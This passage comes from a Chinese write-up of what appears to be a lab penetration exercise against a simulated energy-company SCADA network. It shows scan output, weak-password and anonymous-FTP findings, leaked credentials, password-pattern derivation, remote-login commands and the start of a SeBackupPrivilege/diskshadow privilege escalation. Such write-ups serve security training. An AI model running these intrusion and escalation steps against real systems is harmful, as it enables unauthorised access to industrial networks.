<span class="hljs-string">[-&gt;]</span>WIN-ENGINEER<br>   <span class="hljs-string">[-&gt;]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">17</span>.<span class="hljs-number">6</span><br><span class="hljs-string">[*]</span> WebTitle http://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">17</span>.<span class="hljs-number">6</span>        code:<span class="hljs-number">200</span> len:<span class="hljs-number">661</span>    title:<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">17</span>.<span class="hljs-number">6</span> - /<br><span class="hljs-string">[*]</span> WebTitle http://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">17</span>.<span class="hljs-number">213</span>:<span class="hljs-number">8080</span> code:<span class="hljs-number">302</span> len:<span class="hljs-number">0</span>      title:None 跳转url: http://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">17</span>.<span class="hljs-number">213</span>:<span class="hljs-number">8080</span>/login;jsessionid=34E3E1DB0B1504872D1A73733BAD037E<br><span class="hljs-string">[+]</span> ftp <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">17</span>.<span class="hljs-number">6</span>:<span class="hljs-number">21</span>:anonymous <br>   <span class="hljs-string">[-&gt;]</span>Modbus<br>   <span class="hljs-string">[-&gt;]</span>PLC<br>   <span class="hljs-string">[-&gt;]</span>web.config<br>   <span class="hljs-string">[-&gt;]</span>WinCC<br>   <span class="hljs-string">[-&gt;]</span>内部软件<br>   <span class="hljs-string">[-&gt;]</span>火创能源内部资料<br><span class="hljs-string">[*]</span> WebTitle http://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">17</span>.<span class="hljs-number">213</span>:<span class="hljs-number">8080</span>/login;jsessionid=34E3E1DB0B1504872D1A73733BAD037E code:<span class="hljs-number">200</span> len:<span class="hljs-number">2936</span>   title:火创能源监控画面管理平台<br><span class="hljs-string">[+]</span> PocScan http://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">17</span>.<span class="hljs-number">213</span>:<span class="hljs-number">8080</span> poc-yaml-spring-actuator-heapdump-file <br><span class="hljs-string">[+]</span> PocScan http://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">17</span>.<span class="hljs-number">213</span>:<span class="hljs-number">8080</span> poc-yaml-springboot-env-unauth spring2<br>已完成 <span class="hljs-number">7</span>/<span class="hljs-number">8</span> <span class="hljs-string">[-]</span> ssh <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">17</span>.<span class="hljs-number">213</span>:<span class="hljs-number">22</span> root root@<span class="hljs-number">123</span>#<span class="hljs-number">4</span> ssh: handshake failed: ssh: unable to authenticate, attempted methods <span class="hljs-string">[none password]</span>, no supported methods remain <br>已完成 <span class="hljs-number">7</span>/<span class="hljs-number">8</span> <span class="hljs-string">[-]</span> ssh <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">17</span>.<span class="hljs-number">213</span>:<span class="hljs-number">22</span> root Aa1234 ssh: handshake failed: ssh: unable to authenticate, attempted methods <span class="hljs-string">[none password]</span>, no supported methods remain <br>已完成 <span class="hljs-number">7</span>/<span class="hljs-number">8</span> <span class="hljs-string">[-]</span> ssh <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">17</span>.<span class="hljs-number">213</span>:<span class="hljs-number">22</span> admin pass@<span class="hljs-number">123</span> ssh: handshake failed: ssh: unable to authenticate, attempted methods <span class="hljs-string">[none password]</span>, no supported methods remain <br>已完成 <span class="hljs-number">7</span>/<span class="hljs-number">8</span> <span class="hljs-string">[-]</span> ssh <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">17</span>.<span class="hljs-number">213</span>:<span class="hljs-number">22</span> admin admin@<span class="hljs-number">123</span>#<span class="hljs-number">4</span> ssh: handshake failed: ssh: unable to authenticate, attempted methods <span class="hljs-string">[none password]</span>, no supported methods remain <br>已完成 <span class="hljs-number">7</span>/<span class="hljs-number">8</span> <span class="hljs-string">[-]</span> ssh <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">17</span>.<span class="hljs-number">213</span>:<span class="hljs-number">22</span> admin 1qaz2wsx ssh: handshake failed: ssh: unable to authenticate, attempted methods <span class="hljs-string">[none password]</span>, no supported methods remain <br>已完成 <span class="hljs-number">7</span>/<span class="hljs-number">8</span> <span class="hljs-string">[-]</span> ssh <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">17</span>.<span class="hljs-number">213</span>:<span class="hljs-number">22</span> admin 1q2w3e ssh: handshake failed: ssh: unable to authenticate, attempted methods <span class="hljs-string">[none password]</span>, no supported methods remain <br>已完成 <span class="hljs-number">8</span>/<span class="hljs-number">8</span><br><span class="hljs-string">[*]</span> 扫描结束,耗时: 6m16.318813323s<br><br> ./fscan -h <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>/<span class="hljs-number">16</span><br><br>   ___                              _    <br>  / _ \     ___  ___ _ __ __ _  ___| | __ <br> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /<br>/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    <br>\____/     |___/\___|_|  \__,_|\___|_|\_\   <br>                     fscan version: <span class="hljs-number">1</span>.<span class="hljs-number">8</span>.<span class="hljs-number">4</span><br>start infoscan<br>(icmp) Target <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">17</span>.<span class="hljs-number">213</span>   is alive<br>(icmp) Target <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">17</span>.<span class="hljs-number">6</span>     is alive<br>(icmp) Target <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">26</span>.<span class="hljs-number">11</span>    is alive<br>(icmp) Target <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">255</span>.<span class="hljs-number">253</span>  is alive<br><span class="hljs-string">[*]</span> LiveTop <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>/<span class="hljs-number">16</span>    段存活数量为: <span class="hljs-number">4</span><br><span class="hljs-string">[*]</span> LiveTop <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">17</span>.<span class="hljs-number">0</span>/<span class="hljs-number">24</span>   段存活数量为: <span class="hljs-number">2</span><br><span class="hljs-string">[*]</span> LiveTop <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">26</span>.<span class="hljs-number">0</span>/<span class="hljs-number">24</span>   段存活数量为: <span class="hljs-number">1</span><br><span class="hljs-string">[*]</span> LiveTop <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">255</span>.<span class="hljs-number">0</span>/<span class="hljs-number">24</span>  段存活数量为: <span class="hljs-number">1</span><br><span class="hljs-string">[*]</span> Icmp alive hosts len is: <span class="hljs-number">4</span><br><span class="hljs-number">172.22.17.6:445</span> open<br><span class="hljs-number">172.22.17.6:139</span> open<br><span class="hljs-number">172.22.26.11:139</span> open<br><span class="hljs-number">172.22.26.11:135</span> open<br><span class="hljs-number">172.22.17.6:135</span> open<br><span class="hljs-number">172.22.17.6:21</span> open<br><span class="hljs-number">172.22.26.11:80</span> open<br><span class="hljs-number">172.22.17.6:80</span> open<br><span class="hljs-number">172.22.26.11:1433</span> open<br><span class="hljs-number">172.22.26.11:445</span> open<br><span class="hljs-string">[*]</span> alive ports len is: <span class="hljs-number">10</span><br>start vulscan<br><span class="hljs-string">[*]</span> NetInfo <br><span class="hljs-string">[*]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">26</span>.<span class="hljs-number">11</span><br>   <span class="hljs-string">[-&gt;]</span>WIN-SCADA<br>   <span class="hljs-string">[-&gt;]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">26</span>.<span class="hljs-number">11</span><br><span class="hljs-string">[*]</span> NetBios <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">17</span>.<span class="hljs-number">6</span>     WORKGROUP\WIN-ENGINEER        <br><span class="hljs-string">[*]</span> NetBios <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">26</span>.<span class="hljs-number">11</span>    WORKGROUP\WIN-SCADA           <br><span class="hljs-string">[*]</span> WebTitle http://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">26</span>.<span class="hljs-number">11</span>       code:<span class="hljs-number">200</span> len:<span class="hljs-number">703</span>    title:IIS Windows Server<br><span class="hljs-string">[*]</span> WebTitle http://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">17</span>.<span class="hljs-number">6</span>        code:<span class="hljs-number">200</span> len:<span class="hljs-number">661</span>    title:<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">17</span>.<span class="hljs-number">6</span> - /<br><span class="hljs-string">[+]</span> mssql <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">26</span>.<span class="hljs-number">11</span>:<span class="hljs-number">1433</span>:sa <span class="hljs-number">123456</span><br><span class="hljs-string">[*]</span> NetInfo <br><span class="hljs-string">[*]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">17</span>.<span class="hljs-number">6</span><br>   <span class="hljs-string">[-&gt;]</span>WIN-ENGINEER<br>   <span class="hljs-string">[-&gt;]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">17</span>.<span class="hljs-number">6</span><br><span class="hljs-string">[+]</span> ftp <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">17</span>.<span class="hljs-number">6</span>:<span class="hljs-number">21</span>:anonymous <br>   <span class="hljs-string">[-&gt;]</span>Modbus<br>   <span class="hljs-string">[-&gt;]</span>PLC<br>   <span class="hljs-string">[-&gt;]</span>web.config<br>   <span class="hljs-string">[-&gt;]</span>WinCC<br>   <span class="hljs-string">[-&gt;]</span>内部软件<br>   <span class="hljs-string">[-&gt;]</span>火创能源内部资料<br>已完成 <span class="hljs-number">10</span>/<span class="hljs-number">10</span><br><span class="hljs-string">[*]</span> 扫描结束,耗时: <span class="hljs-number">10</span>.487932257s<br></code></pre></td></tr></table></figure>
+
+<p>提取关键资产：</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-string">[*]</span> NetBios <span class="hljs-number">172.22</span><span class="hljs-number">.17</span><span class="hljs-number">.6</span>     WORKGROUP\WIN-ENGINEER        <br><span class="hljs-string">[*]</span> NetBios <span class="hljs-number">172.22</span><span class="hljs-number">.26</span><span class="hljs-number">.11</span>    WORKGROUP\WIN-SCADA <br></code></pre></td></tr></table></figure>
+
+<h2 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h2><p><code>172.22.17.6</code> 存在敏感信息泄露：</p>
+<p>扫出来一个匿名ftp，连一下</p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs stata">proxychains ftp 172.22.17.6             <br>[proxychains] config <span class="hljs-keyword">file</span> found: /etc/proxychains4.<span class="hljs-keyword">conf</span><br>[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.<span class="hljs-keyword">so</span>.4<br>[proxychains] DLL init: proxychains-ng 4.17<br>[proxychains] Strict chain  ...  127.0.0.1:55556  ...  172.22.17.6:21  ...  OK<br>Connected to 172.22.17.6.<br>220 Microsoft FTP Service<br>Name (172.22.17.6:<span class="hljs-keyword">matrix</span>): anonymous<br>331 Anonymous access allowed, send identity (<span class="hljs-keyword">e</span>-mail name) <span class="hljs-keyword">as</span> password.<br>Password: <br>230 User logged <span class="hljs-keyword">in</span>.<br>Remote system <span class="hljs-keyword">type</span> is Windows_NT.<br>ftp&gt; <span class="hljs-keyword">ls</span><br>229 Entering Extended Passive Mode (|||50909|)<br>[proxychains] Strict chain  ...  127.0.0.1:55556  ...  172.22.17.6:50909  ...  OK<br>125 Data connection already <span class="hljs-keyword">open</span>; Transfer starting.<br>12-25-23  10:39PM       &lt;<span class="hljs-keyword">DIR</span>&gt;          Modbus<br>12-25-23  10:41PM       &lt;<span class="hljs-keyword">DIR</span>&gt;          PLC<br>12-25-23  10:43PM                  168 web.config<br>12-25-23  10:37PM       &lt;<span class="hljs-keyword">DIR</span>&gt;          WinCC<br>12-26-23  12:22AM       &lt;<span class="hljs-keyword">DIR</span>&gt;          �ڲ�����<br>12-27-23  02:01AM       &lt;<span class="hljs-keyword">DIR</span>&gt;          ������Դ�ڲ�����<br>226 Transfer complete.<br>ftp&gt; chcp 65001<br>?Invalid command.<br>ftp&gt; <br><br></code></pre></td></tr></table></figure>
+
+<p>http也可以访问到</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152215017.png" srcset="/img/loading.gif" lazyload alt="image-20251023165356039"></p>
+<p>在火创能源内部资料中得到 <code>WIN-SCADA</code> 的管理员账号密码：</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-section">http://172.22.17.6/火创能源内部资料/SCADA.txt</span><br><span class="hljs-section">-----</span><br>WIN-SCADA: 172.22.26.xx<br>Username: Administrator<br>Password: IYnT3GyCiy3<br></code></pre></td></tr></table></figure>
+
+<p>内部通知里包含初始密码组成方式：</p>
+<blockquote>
+<ol>
+<li><p>登陆权限限制：<br>为确保信息系统的安全性，自即日起，公司所有工程师PC的登陆将由SCADA工程师进行控制。请各位工程师注意，只能通过SCADA工程师提供的登陆方式进行访问。</p>
+</li>
+<li><p>登陆账户设置：<br>为方便管理和标准化，登陆账户名将采用姓名全称的小写拼音形式。例如，张三的账户名为zhangsan，工号为0801。初始密码将由账户名+@+工号组成，例如，zhangsan@0801。</p>
+</li>
+</ol>
+</blockquote>
+<p>在内部通讯录中提取 SCADA 工程师信息：</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152215125.png" srcset="/img/loading.gif" lazyload alt="20240313104330-7a07c798-e0e3-1"></p>
+<p>根据内部通知的初始密码规则，得到 SCADA 工程师的账号密码如下：</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">chenhua/<span class="hljs-symbol">chenhua@</span><span class="hljs-number">0813</span><br>zhaoli/<span class="hljs-symbol">zhaoli@</span><span class="hljs-number">0821</span><br>wangning/<span class="hljs-symbol">wangning@</span><span class="hljs-number">0837</span><br>zhangling/<span class="hljs-symbol">zhangling@</span><span class="hljs-number">0871</span><br>zhangying/<span class="hljs-symbol">zhangying@</span><span class="hljs-number">0888</span><br>wangzhiqiang/<span class="hljs-symbol">wangzhiqiang@</span><span class="hljs-number">0901</span><br>chentao/<span class="hljs-symbol">chentao@</span><span class="hljs-number">0922</span><br>zhouyong/<span class="hljs-symbol">zhouyong@</span><span class="hljs-number">0939</span><br>lilong/<span class="hljs-symbol">lilong@</span><span class="hljs-number">1046</span><br>liyumei/<span class="hljs-symbol">liyumei@</span><span class="hljs-number">1048</span><br></code></pre></td></tr></table></figure>
+
+<p>impacket 验证：</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-comment"># 报错 rpc_s_access_denied</span><br>proxychains impacket-wmiexec chenhua:<span class="hljs-string">&quot;chenhua<span class="hljs-variable">@0813</span>&quot;</span><span class="hljs-variable">@172</span><span class="hljs-number">.22</span><span class="hljs-number">.17</span>.<span class="hljs-number">6</span> -codec gbk<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>[!NOTE] rpc_s_access_denied<br>在只知道 NTLM Hash 的情况下，只有 RID 为 500 的管理员用户才能绕过 UAC 成功执行 PTH；若 RID 不是 500，即便是在本地管理员用户组里也无法执行 PTH。</p>
+</blockquote>
+<p>chenhua 账号 rdp 登录：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">[*] NetBios 172.22.17.6     WORKGROUP\WIN-ENGINEER<br>proxychains xfreerdp3 /u:zhangying /p:zhangying@0888 /v:172.22.17.6 /cert:ignore<br></code></pre></td></tr></table></figure>
+
+<h2 id="Backup-Operators-组提权"><a href="#Backup-Operators-组提权" class="headerlink" title="?Backup Operators 组提权"></a>?Backup Operators 组提权</h2><p>要提权，上winPEASx64.exe</p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">winPEASx64.exe <span class="hljs-built_in">log</span><br>[<span class="hljs-number">1</span>;<span class="hljs-number">32</span>m<span class="hljs-string">&quot;log&quot;</span> argument present, redirecting output <span class="hljs-keyword">to</span> <span class="hljs-built_in">file</span> <span class="hljs-string">&quot;out.txt&quot;</span>[<span class="hljs-number">0</span>m<br></code></pre></td></tr></table></figure>
+
+<p><strong>高危项：</strong></p>
+<ol>
+<li><strong>计划任务目录可写</strong>：可植入定时执行的恶意程序。</li>
+<li><strong>Unquoted Service Path</strong>：多个服务路径未加引号且有空格，可通过文件名伪造实现提权。</li>
+<li><strong>Backup Operators 组</strong>：可尝试备份 SYSTEM&#x2F;SAM 注册表文件本地提权。</li>
+<li><strong>WSUS 配置不安全</strong>：可利用 wsuxploit 工具进行提权。</li>
+<li><strong>防火墙关闭</strong>：攻击面极大，易被横向渗透。</li>
+<li><strong>3389&#x2F;RDP、445&#x2F;SMB 开放</strong>：可尝试远程爆破、横向移动。</li>
+<li><strong>敏感文件（如 Unattend.xml、CredentialSettings.xml）</strong>：可能存储明文密码。</li>
+</ol>
+<p><code>chenhua</code>属于<code>Backup Operators</code>，默认情况下会授予该组 SeBackup 和 SeRestore 权限，现在居然没有。不过因为用户在Backup Operators组内，所以可以使用Backup Operators组内权限提权(<a target="_blank" rel="noopener" href="https://github.com/k4sth4/SeBackupPrivilege">https://github.com/k4sth4/SeBackupPrivilege</a>)</p>
+<h3 id="SeBackupPrivilege"><a href="#SeBackupPrivilege" class="headerlink" title="SeBackupPrivilege"></a>SeBackupPrivilege</h3><blockquote>
+<p>[!NOTE] 使用 SeBackupPrivilege 权限实现权限提升</p>
+<ul>
+<li>SeBackupPrivilege 权限用来实现备份操作，允许文件内容检索，即使文件上的安全描述符可能未授予此类访问权限。diskshadow 是 Windows 的内置功能，可以帮助创建备份。参考 <a target="_blank" rel="noopener" href="https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/">hackingarticles</a>，可以在本地或 DC 进行权限提升。</li>
+<li>Privilege 靶场中也使用该方式实现权限提升。ThermalPower 只涉及本地权限提升，不涉及 DC。</li>
+</ul>
+</blockquote>
+<p>查看 systeminfo：</p>
+<figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext">C:\Users\chenhua&gt;systeminfo<br><br><span class="hljs-attribute">主机名</span><span class="hljs-punctuation">:</span> <span class="hljs-string">          WIN-ENGINEER</span><br><span class="hljs-attribute">OS 名称</span><span class="hljs-punctuation">:</span> <span class="hljs-string">         Microsoft Windows Server 2022 Datacenter</span><br><span class="hljs-attribute">OS 版本</span><span class="hljs-punctuation">:</span> <span class="hljs-string">         10.0.20348 暂缺 Build 20348</span><br><span class="hljs-attribute">OS 制造商</span><span class="hljs-punctuation">:</span> <span class="hljs-string">       Microsoft Corporation</span><br><span class="hljs-attribute">OS 配置</span><span class="hljs-punctuation">:</span> <span class="hljs-string">         独立服务器</span><br><span class="hljs-attribute">OS 构建类型</span><span class="hljs-punctuation">:</span> <span class="hljs-string">     Multiprocessor Free</span><br><span class="hljs-attribute">注册的所有人</span><span class="hljs-punctuation">:</span><br><span class="hljs-attribute">注册的组织</span><span class="hljs-punctuation">:</span> <span class="hljs-string">      Aliyun</span><br><span class="hljs-attribute">产品 ID</span><span class="hljs-punctuation">:</span> <span class="hljs-string">         00454-60000-00001-AA888</span><br><span class="hljs-attribute">初始安装日期</span><span class="hljs-punctuation">:</span> <span class="hljs-string">    2023/12/25, 20:35:07</span><br><span class="hljs-attribute">系统启动时间</span><span class="hljs-punctuation">:</span> <span class="hljs-string">    2024/3/4, 13:41:17</span><br><span class="hljs-attribute">系统制造商</span><span class="hljs-punctuation">:</span> <span class="hljs-string">      Alibaba Cloud</span><br><span class="hljs-attribute">系统型号</span><span class="hljs-punctuation">:</span> <span class="hljs-string">        Alibaba Cloud ECS</span><br><span class="hljs-attribute">系统类型</span><span class="hljs-punctuation">:</span> <span class="hljs-string">        x64-based PC</span><br><span class="hljs-attribute">处理器</span><span class="hljs-punctuation">:</span> <span class="hljs-string">          安装了 1 个处理器。</span><br>                  <span class="hljs-attribute">[01]</span><span class="hljs-punctuation">:</span> <span class="hljs-string">Intel64 Family 6 Model 85 Stepping 7 GenuineIntel ~2500 Mhz</span><br><span class="hljs-attribute">BIOS 版本</span><span class="hljs-punctuation">:</span> <span class="hljs-string">       SeaBIOS 449e491, 2014/4/1</span><br><span class="hljs-attribute">Windows 目录</span><span class="hljs-punctuation">:</span> <span class="hljs-string">    C:\Windows</span><br><span class="hljs-attribute">系统目录</span><span class="hljs-punctuation">:</span> <span class="hljs-string">        C:\Windows\system32</span><br><span class="hljs-attribute">启动设备</span><span class="hljs-punctuation">:</span> <span class="hljs-string">        \Device\HarddiskVolume1</span><br><span class="hljs-attribute">系统区域设置</span><span class="hljs-punctuation">:</span> <span class="hljs-string">    zh-cn;中文(中国)</span><br><span class="hljs-attribute">输入法区域设置</span><span class="hljs-punctuation">:</span> <span class="hljs-string">  zh-cn;中文(中国)</span><br><span class="hljs-attribute">时区</span><span class="hljs-punctuation">:</span> <span class="hljs-string">            (UTC+08:00) 北京，重庆，香港特别行政区，乌鲁木齐</span><br><span class="hljs-attribute">物理内存总量</span><span class="hljs-punctuation">:</span> <span class="hljs-string">    3,950 MB</span><br><span class="hljs-attribute">可用的物理内存</span><span class="hljs-punctuation">:</span> <span class="hljs-string">  2,137 MB</span><br><span class="hljs-attribute">虚拟内存</span><span class="hljs-punctuation">:</span> <span class="hljs-string">最大值: 5,358 MB</span><br><span class="hljs-attribute">虚拟内存</span><span class="hljs-punctuation">:</span> <span class="hljs-string">可用:   3,600 MB</span><br><span class="hljs-attribute">虚拟内存</span><span class="hljs-punctuation">:</span> <span class="hljs-string">使用中: 1,758 MB</span><br><span class="hljs-attribute">页面文件位置</span><span class="hljs-punctuation">:</span> <span class="hljs-string">    C:\pagefile.sys</span><br><span class="hljs-attribute">域</span><span class="hljs-punctuation">:</span> <span class="hljs-string">              WORKGROUP</span><br><span class="hljs-attribute">登录服务器</span><span class="hljs-punctuation">:</span> <span class="hljs-string">      \\WIN-ENGINEER</span><br><span class="hljs-attribute">修补程序</span><span class="hljs-punctuation">:</span> <span class="hljs-string">        安装了 3 个修补程序。</span><br>                  <span class="hljs-attribute">[01]</span><span class="hljs-punctuation">:</span> <span class="hljs-string">KB5031993</span><br>                  <span class="hljs-attribute">[02]</span><span class="hljs-punctuation">:</span> <span class="hljs-string">KB5032198</span><br>                  <span class="hljs-attribute">[03]</span><span class="hljs-punctuation">:</span> <span class="hljs-string">KB5032310</span><br><span class="hljs-attribute">网卡</span><span class="hljs-punctuation">:</span> <span class="hljs-string">            安装了 1 个 NIC。</span><br>                  <span class="hljs-attribute">[01]</span><span class="hljs-punctuation">:</span> <span class="hljs-string">Red Hat VirtIO Ethernet Adapter</span><br>                      <span class="hljs-attribute">连接名</span><span class="hljs-punctuation">:</span> <span class="hljs-string">     以太网</span><br>                      <span class="hljs-attribute">启用 DHCP</span><span class="hljs-punctuation">:</span> <span class="hljs-string">  是</span><br>                      <span class="hljs-attribute">DHCP 服务器</span><span class="hljs-punctuation">:</span> <span class="hljs-string">172.22.255.253</span><br>                      <span class="hljs-attribute">IP 地址</span><br><span class="hljs-attribute">                        [01]</span><span class="hljs-punctuation">:</span> <span class="hljs-string">172.22.17.6</span><br>                        <span class="hljs-attribute">[02]</span><span class="hljs-punctuation">:</span> <span class="hljs-string">fe80::6ee2:423a:4d01:5191</span><br><span class="hljs-attribute">Hyper-V 要求</span><span class="hljs-punctuation">:</span> <span class="hljs-string">    已检测到虚拟机监控程序。将不显示 Hyper-V 所需的功能。</span><br></code></pre></td></tr></table></figure>
+
+<p>查看特权信息，此时 SeBackupPrivilege 未开启：</p>
+<p>SetBackup权限用于允许进程绕过通常的文件和目录权限限制，以读取系统的所有文件和目录。它主要用于备份操作，在创建系统备份时，可以让进程访问即使没有显式权限的文件，拥有这个权限的用户可以访问文件系统的任意文件</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">PS C:\Windows\system32&gt; whoami /priv<br><br><span class="hljs-section">特权信息</span><br><span class="hljs-section">----------------------</span><br><br>特权名                        描述           状态<br>============================= ============== ======<br>SeBackupPrivilege             备份文件和目录 已禁用<br>SeRestorePrivilege            还原文件和目录 已禁用<br>SeShutdownPrivilege           关闭系统       已禁用<br>SeChangeNotifyPrivilege       绕过遍历检查   已启用<br>SeIncreaseWorkingSetPrivilege 增加进程工作集 已禁用<br></code></pre></td></tr></table></figure>
+
+<p>此时访问 Administrator 目录，提示拒绝访问：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\Windows\system32&gt; <span class="hljs-built_in">dir</span> C:\Users\Administrator\flag\<br><span class="hljs-built_in">dir</span> : 拒绝访问。<br></code></pre></td></tr></table></figure>
+
+<p>使用 <a target="_blank" rel="noopener" href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeBackupPrivilege.ps1">EnableSeBackupPrivilege.ps1</a>启用 SeBackupPrivilege：</p>
+<figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq"><span class="hljs-keyword">Import</span>-<span class="hljs-keyword">Module</span> .\EnableSeBackupPrivilege.ps1<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152215107.png" srcset="/img/loading.gif" lazyload alt="image-20251023173152147"></p>
+<p>接下来我们创建目标系统上 C 盘的备份。</p>
+<p>先新建 s.dsh 文件，并将下面内容写入：</p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> context <span class="hljs-comment">persistent nowriters</span><br>add <span class="hljs-comment">volume c: alias mydrive</span><br>create<br>expose <span class="hljs-comment">%mydrive% z:</span><br></code></pre></td></tr></table></figure>
+
+<p>将 s.dsh 文件编码和间距转换为与 Windows 机器兼容形式（在 Windows 上新建 s.dsh 可忽略此步）：</p>
